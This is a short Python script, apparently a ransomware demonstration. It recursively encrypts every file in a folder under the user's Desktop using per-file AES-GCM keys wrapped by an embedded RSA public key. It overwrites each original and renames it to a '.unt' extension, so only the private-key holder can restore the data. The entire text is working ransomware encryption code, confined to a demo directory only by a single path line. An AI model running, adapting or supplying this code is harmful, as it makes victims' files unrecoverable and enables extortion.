from pathlib import Path
from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Hash import SHA256
from Cryptodome.Random import get_random_bytes

PUBLIC_KEY = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxgoOyqgZKaIJQHKw2nrJ
v9tL/c5MgoKgKehyyLtSXMuYZkeGp2XJ7jrp0RXJqb9PAPZucCTIaM/JpfvwInWe
kdNmBU4dl/9po/UvEvxAGLEAlKOBGhJWK7H7JLBDlW79CxAl0FtNRrBB1VZIqVbC
/zmM9lHTrhGgjAZfqqzRFmO21q8+l1QgFfZIKim68fzYa9QpjdsJp7tDcIS1kIP/
s+NM7nfVBbFC2rGLr+XxIyXjYmNDQ/ra9c0uC8AFEbUIPJitPFlsi8VcYpM3ofN7
9poQJc2ggiTZAbEVUDaeJ6BPyTAcNv8Deogzh2+kPLB/3fAkKJAsVIU5948UGJyR
VQIDAQAB
-----END PUBLIC KEY-----"""

base = Path.home() / "Desktop" / "RansomDemo"
rsa = PKCS1_OAEP.new(RSA.import_key(PUBLIC_KEY), hashAlgo=SHA256)

for p in (base / "critical_tk0667").rglob("*"):
    if not p.is_file() or p.name.endswith(".unt"):
        continue
    key = get_random_bytes(32)
    aes = AES.new(key, AES.MODE_GCM)
    ct, tag = aes.encrypt_and_digest(p.read_bytes())
    ek = rsa.encrypt(key)
    p.write_bytes(b"UNTDEMO2" + len(ek).to_bytes(2, "big") + ek + bytes([len(aes.nonce)]) + aes.nonce + tag + ct)
    p.replace(p.parent / (p.name + ".unt"))
    print("Encrypted:", p.name + ".unt")
